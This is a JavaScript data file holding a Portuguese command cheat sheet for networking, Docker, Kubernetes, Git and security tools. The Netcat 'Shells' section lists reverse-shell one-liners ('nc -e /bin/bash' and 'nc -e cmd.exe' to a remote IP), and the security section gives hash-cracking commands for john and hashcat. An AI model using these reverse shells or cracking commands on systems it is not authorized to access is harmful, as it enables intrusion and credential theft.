export const data = [
  {
    id: 'redes',
    label: 'Redes',
    sections: [
      {
        title: 'Ping',
        commands: [
          { cmd: 'ping host', desc: 'Verifica conectividade com o host' },
          { cmd: 'ping -c 5 host', desc: 'Envia exatamente 5 pacotes' },
          { cmd: 'ping -i 0.2 host', desc: 'Intervalo de 0.2s entre pacotes' },
          { cmd: 'ping -s 1472 host', desc: 'Define o tamanho do pacote em bytes' },
          { cmd: 'ping -t 64 host', desc: 'Define o TTL dos pacotes' },
          { cmd: 'ping6 host', desc: 'Ping via IPv6' },
        ],
      },
      {
        title: 'Traceroute / Tracepath',
        commands: [
          { cmd: 'traceroute host', desc: 'Rastreia a rota até o host' },
          { cmd: 'traceroute -n host', desc: 'Sem resolução de DNS (mais rápido)' },
          { cmd: 'traceroute -p 443 host', desc: 'Usa porta específica' },
          { cmd: 'tracepath host', desc: 'Alternativa sem privilégios root' },
          { cmd: 'mtr host', desc: 'Ping + traceroute em tempo real' },
        ],
      },
      {
        title: 'SS / Netstat',
        commands: [
          { cmd: 'ss -tuln', desc: 'Lista portas abertas TCP/UDP' },
          { cmd: 'ss -tp', desc: 'Processo associado a cada conexão' },
          { cmd: 'ss -s', desc: 'Resumo de estatísticas de sockets' },
          { cmd: 'netstat -rn', desc: 'Tabela de roteamento' },
          { cmd: 'netstat -i', desc: 'Estatísticas por interface' },
        ],
      },
    ],
  },
  {
    id: 'netcat',
    label: 'Netcat',
    sections: [
      {
        title: 'Uso Básico',
        commands: [
          { cmd: 'nc -lvnp 4444', desc: 'Servidor ouvindo na porta 4444' },
          { cmd: 'nc 192.168.1.10 4444', desc: 'Cliente conectando ao servidor' },
          { cmd: 'nc -zv 192.168.1.10 20-80', desc: 'Port scan simples' },
          { cmd: 'nc -nv 192.168.1.10 80', desc: 'Banner grabbing de serviço' },
          { cmd: 'nc -u host 5005', desc: 'Conexão UDP' },
        ],
      },
      {
        title: 'Transferência de Arquivos',
        commands: [
          { cmd: 'nc -lvnp 4444 > recebido.txt', desc: 'Receptor — aguarda arquivo' },
          { cmd: 'nc 192.168.1.10 4444 < arquivo.txt', desc: 'Emissor — envia arquivo' },
        ],
      },
      {
        title: 'Shells',
        commands: [
          { cmd: 'nc -e /bin/bash 192.168.1.10 4444', desc: 'Shell reversa Linux' },
          { cmd: 'nc -e cmd.exe 192.168.1.10 4444', desc: 'Shell reversa Windows' },
        ],
      },
    ],
  },
  {
    id: 'seguranca',
    label: 'Segurança',
    sections: [
      {
        title: 'Nmap',
        commands: [
          { cmd: 'nmap 192.168.1.10', desc: 'Scan básico de host' },
          { cmd: 'nmap 192.168.1.0/24', desc: 'Scan de rede inteira' },
          { cmd: 'nmap -sV 192.168.1.10', desc: 'Detectar versões de serviços' },
          { cmd: 'nmap -sC 192.168.1.10', desc: 'Scan com scripts NSE padrão' },
          { cmd: 'nmap -A 192.168.1.10', desc: 'Scan agressivo (versão + OS + scripts)' },
          { cmd: 'nmap -sS 192.168.1.10', desc: 'SYN scan (stealth)' },
          { cmd: 'nmap -sU 192.168.1.10', desc: 'Scan UDP' },
          { cmd: 'nmap -p 22,80,443 192.168.1.10', desc: 'Scan de portas específicas' },
          { cmd: 'nmap -oN saida.txt 192.168.1.10', desc: 'Exportar resultado em texto' },
          { cmd: 'nmap -oX saida.xml 192.168.1.10', desc: 'Exportar resultado em XML' },
        ],
      },
      {
        title: 'OpenSSL',
        commands: [
          { cmd: 'openssl s_client -connect host:443', desc: 'Inspecionar certificado SSL' },
          { cmd: 'openssl genrsa -out chave.pem 4096', desc: 'Gerar chave privada RSA 4096' },
          { cmd: 'openssl req -x509 -newkey rsa:4096 -keyout k.pem -out c.pem -days 365 -nodes', desc: 'Gerar certificado autoassinado' },
          { cmd: 'openssl dgst -sha256 arquivo.txt', desc: 'Hash SHA-256 de arquivo' },
          { cmd: 'openssl base64 -in arq.bin -out arq.b64', desc: 'Codificar em base64' },
          { cmd: 'openssl base64 -d -in arq.b64 -out arq.bin', desc: 'Decodificar base64' },
        ],
      },
      {
        title: 'Hashcat / John',
        commands: [
          { cmd: 'john --wordlist=rockyou.txt hash.txt', desc: 'John — ataque de dicionário' },
          { cmd: 'john --show hash.txt', desc: 'John — exibir senhas encontradas' },
          { cmd: 'hashcat -m 0 hash.txt rockyou.txt', desc: 'Hashcat — MD5 com dicionário' },
          { cmd: 'hashcat -m 1400 hash.txt wordlist.txt', desc: 'Hashcat — SHA-256' },
          { cmd: 'hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d', desc: 'Hashcat — força bruta (máscara)' },
          { cmd: 'hash-identifier < hash.txt', desc: 'Identificar tipo de hash' },
        ],
      },
    ],
  },
  {
    id: 'ssh',
    label: 'SSH & Curl',
    sections: [
      {
        title: 'SSH',
        commands: [
          { cmd: 'ssh usuario@host', desc: 'Conexão básica' },
          { cmd: 'ssh -p 2222 usuario@host', desc: 'Porta customizada' },
          { cmd: 'ssh -i ~/.ssh/chave usuario@host', desc: 'Usar chave específica' },
          { cmd: 'ssh -L 8080:localhost:80 usuario@host', desc: 'Túnel local (port forward)' },
          { cmd: 'ssh -R 9090:localhost:3000 usuario@host', desc: 'Túnel reverso' },
          { cmd: 'ssh -D 1080 usuario@host', desc: 'Proxy SOCKS5' },
          { cmd: 'ssh usuario@host "ls -la /var/log"', desc: 'Executar comando remoto' },
          { cmd: 'scp usuario@host:/caminho/arq.txt .', desc: 'Copiar arquivo remoto' },
          { cmd: 'rsync -avz usuario@host:/orig/ ./dest/', desc: 'Sincronizar diretório' },
        ],
      },
      {
        title: 'Curl',
        commands: [
          { cmd: 'curl https://exemplo.com', desc: 'GET simples' },
          { cmd: 'curl -v https://exemplo.com', desc: 'GET com headers detalhados' },
          { cmd: "curl -X POST https://api.com -H 'Content-Type: application/json' -d '{\"k\":\"v\"}'", desc: 'POST com JSON' },
          { cmd: "curl -H 'Authorization: Bearer TOKEN' https://api.com", desc: 'Autenticação Bearer' },
          { cmd: 'curl -O https://exemplo.com/arquivo.zip', desc: 'Download de arquivo' },
          { cmd: 'curl -L https://exemplo.com', desc: 'Seguir redirecionamentos' },
          { cmd: 'curl -k https://exemplo.com', desc: 'Ignorar verificação SSL' },
          { cmd: 'curl --max-time 10 https://exemplo.com', desc: 'Definir timeout de 10s' },
        ],
      },
    ],
  },
  {
    id: 'docker',
    label: 'Docker',
    sections: [
      {
        title: 'Imagens',
        commands: [
          { cmd: 'docker pull nginx:latest', desc: 'Baixar imagem do registry' },
          { cmd: 'docker images', desc: 'Listar imagens locais' },
          { cmd: 'docker build -t app:1.0 .', desc: 'Build de imagem' },
          { cmd: 'docker rmi app:1.0', desc: 'Remover imagem' },
          { cmd: 'docker image prune -a', desc: 'Remover imagens não usadas' },
        ],
      },
      {
        title: 'Containers',
        commands: [
          { cmd: 'docker run -d -p 8080:80 --name web nginx', desc: 'Subir container em background' },
          { cmd: 'docker ps', desc: 'Listar containers ativos' },
          { cmd: 'docker ps -a', desc: 'Listar todos os containers' },
          { cmd: 'docker stop web', desc: 'Parar container' },
          { cmd: 'docker rm web', desc: 'Remover container' },
          { cmd: 'docker restart web', desc: 'Reiniciar container' },
        ],
      },
      {
        title: 'Logs e Debug',
        commands: [
          { cmd: 'docker logs -f web', desc: 'Seguir logs em tempo real' },
          { cmd: 'docker exec -it web bash', desc: 'Shell interativo no container' },
          { cmd: 'docker top web', desc: 'Processos rodando no container' },
          { cmd: 'docker stats', desc: 'Uso de CPU/memória em tempo real' },
          { cmd: 'docker inspect web', desc: 'Metadados completos do container' },
        ],
      },
      {
        title: 'Volumes e Redes',
        commands: [
          { cmd: 'docker volume create meu-volume', desc: 'Criar volume' },
          { cmd: 'docker volume ls', desc: 'Listar volumes' },
          { cmd: 'docker network create minha-rede', desc: 'Criar rede' },
          { cmd: 'docker network ls', desc: 'Listar redes' },
        ],
      },
      {
        title: 'Docker Compose',
        commands: [
          { cmd: 'docker compose up -d', desc: 'Subir serviços em background' },
          { cmd: 'docker compose down', desc: 'Parar e remover serviços' },
          { cmd: 'docker compose logs -f', desc: 'Logs de todos os serviços' },
          { cmd: 'docker compose ps', desc: 'Status dos serviços' },
          { cmd: 'docker compose build', desc: 'Rebuild das imagens' },
        ],
      },
    ],
  },
  {
    id: 'kubernetes',
    label: 'Kubernetes',
    sections: [
      {
        title: 'Contexto e Namespace',
        commands: [
          { cmd: 'kubectl config get-contexts', desc: 'Listar contextos disponíveis' },
          { cmd: 'kubectl config use-context meu-cluster', desc: 'Mudar contexto ativo' },
          { cmd: 'kubectl get ns', desc: 'Listar namespaces' },
          { cmd: 'kubectl config set-context --current --namespace=ns', desc: 'Definir namespace padrão' },
        ],
      },
      {
        title: 'Recursos',
        commands: [
          { cmd: 'kubectl get pods', desc: 'Listar pods no namespace atual' },
          { cmd: 'kubectl get pods -A', desc: 'Listar pods em todos os namespaces' },
          { cmd: 'kubectl get deploy', desc: 'Listar deployments' },
          { cmd: 'kubectl get svc', desc: 'Listar services' },
          { cmd: 'kubectl get ingress', desc: 'Listar ingresses' },
          { cmd: 'kubectl get nodes', desc: 'Listar nós do cluster' },
        ],
      },
      {
        title: 'Debug',
        commands: [
          { cmd: 'kubectl describe pod meu-pod', desc: 'Detalhes e eventos do pod' },
          { cmd: 'kubectl logs meu-pod', desc: 'Logs do pod' },
          { cmd: 'kubectl logs -f meu-pod', desc: 'Seguir logs em tempo real' },
          { cmd: 'kubectl logs meu-pod -c container', desc: 'Log de container específico' },
          { cmd: 'kubectl exec -it meu-pod -- bash', desc: 'Shell interativo no pod' },
          { cmd: 'kubectl top pods', desc: 'Uso de CPU/memória dos pods' },
        ],
      },
      {
        title: 'Aplicar e Deletar',
        commands: [
          { cmd: 'kubectl apply -f manifesto.yaml', desc: 'Aplicar manifesto' },
          { cmd: 'kubectl delete -f manifesto.yaml', desc: 'Deletar pelo manifesto' },
          { cmd: 'kubectl delete pod meu-pod', desc: 'Deletar pod' },
          { cmd: 'kubectl rollout restart deploy app', desc: 'Restart de deployment' },
        ],
      },
      {
        title: 'Scale e Rollout',
        commands: [
          { cmd: 'kubectl scale deploy app --replicas=3', desc: 'Escalar para 3 réplicas' },
          { cmd: 'kubectl rollout status deploy app', desc: 'Status do rollout' },
          { cmd: 'kubectl rollout history deploy app', desc: 'Histórico de deploys' },
          { cmd: 'kubectl rollout undo deploy app', desc: 'Rollback para versão anterior' },
        ],
      },
      {
        title: 'Port Forward',
        commands: [
          { cmd: 'kubectl port-forward pod/meu-pod 8080:80', desc: 'Forward de porta do pod' },
          { cmd: 'kubectl port-forward svc/meu-svc 8080:80', desc: 'Forward via service' },
        ],
      },
    ],
  },
  {
    id: 'devops',
    label: 'DevOps',
    sections: [
      {
        title: 'Git',
        commands: [
          { cmd: 'git status', desc: 'Estado do repositório' },
          { cmd: 'git log --oneline --graph --all', desc: 'Histórico visual de branches' },
          { cmd: 'git stash', desc: 'Guardar mudanças temporariamente' },
          { cmd: 'git stash pop', desc: 'Restaurar mudanças guardadas' },
          { cmd: 'git cherry-pick <hash>', desc: 'Aplicar commit específico' },
          { cmd: 'git rebase -i HEAD~3', desc: 'Rebase interativo (últimos 3 commits)' },
          { cmd: 'git bisect start', desc: 'Busca binária por commit com bug' },
          { cmd: 'git diff HEAD~1 HEAD', desc: 'Diff entre commits' },
        ],
      },
      {
        title: 'Processos e Sistema',
        commands: [
          { cmd: 'ps aux | grep nginx', desc: 'Buscar processo por nome' },
          { cmd: 'kill -9 PID', desc: 'Forçar encerramento de processo' },
          { cmd: 'lsof -i :8080', desc: 'Processo usando a porta 8080' },
          { cmd: 'df -h', desc: 'Uso de disco por partição' },
          { cmd: 'du -sh /var/log/*', desc: 'Tamanho de cada diretório' },
          { cmd: 'free -h', desc: 'Uso de memória RAM' },
          { cmd: 'iostat -x 1', desc: 'Estatísticas de I/O de disco' },
        ],
      },
      {
        title: 'Firewall',
        commands: [
          { cmd: 'ufw status verbose', desc: 'Status detalhado do firewall' },
          { cmd: 'ufw allow 443/tcp', desc: 'Liberar porta TCP 443' },
          { cmd: 'ufw deny 23/tcp', desc: 'Bloquear porta TCP 23 (Telnet)' },
          { cmd: 'iptables -L -n -v', desc: 'Listar todas as regras iptables' },
        ],
      },
      {
        title: 'Grep e Find',
        commands: [
          { cmd: 'grep -r "erro" /var/log/', desc: 'Busca recursiva em diretório' },
          { cmd: 'grep -i "error" app.log', desc: 'Busca case insensitive' },
          { cmd: 'grep -n "exception" app.log', desc: 'Mostrar número de linha' },
          { cmd: 'grep -A 3 -B 3 "panic" app.log', desc: '3 linhas de contexto acima e abaixo' },
          { cmd: 'find /etc -name "*.conf" -type f', desc: 'Localizar arquivos .conf' },
          { cmd: 'find / -perm -4000 -type f 2>/dev/null', desc: 'Arquivos com SUID (auditoria)' },
          { cmd: 'find /var/log -mtime -1', desc: 'Arquivos modificados nas últimas 24h' },
        ],
      },
    ],
  },
];
